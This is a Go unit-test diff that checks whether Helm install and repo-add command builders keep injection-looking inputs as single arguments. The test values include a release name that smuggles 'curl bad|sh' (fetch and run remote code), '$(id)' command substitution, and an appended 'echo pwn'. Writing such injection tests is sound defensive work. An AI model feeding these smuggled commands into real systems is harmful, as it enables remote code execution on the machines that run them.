@@ -48,3 +48,23 @@ func TestRepoUpdateCommand(t *testing.T) {
 		t.Fatalf("cmd=%v", cmd)
 	}
 }
+
+func TestCommandBuildersKeepMaliciousLookingArgsAsSingleArg(t *testing.T) {
+	release := "redis;curl bad|sh"
+	chart := "bitnami/redis;$(id)"
+	repoName := "bitnami;echo pwn"
+	repoURL := "https://charts.bitnami.com/bitnami?x=$(id)"
+
+	install := InstallCommand(release, chart, "default", "", 0)
+	if install[0] != "helm" || install[2] != release || install[3] != chart {
+		t.Fatalf("install=%v", install)
+	}
+	if len(install) < 4 {
+		t.Fatalf("install too short: %v", install)
+	}
+
+	repoAdd := RepoAddCommand(repoName, repoURL)
+	if repoAdd[0] != "helm" || repoAdd[3] != repoName || repoAdd[4] != repoURL {
+		t.Fatalf("repo add=%v", repoAdd)
+	}
+}
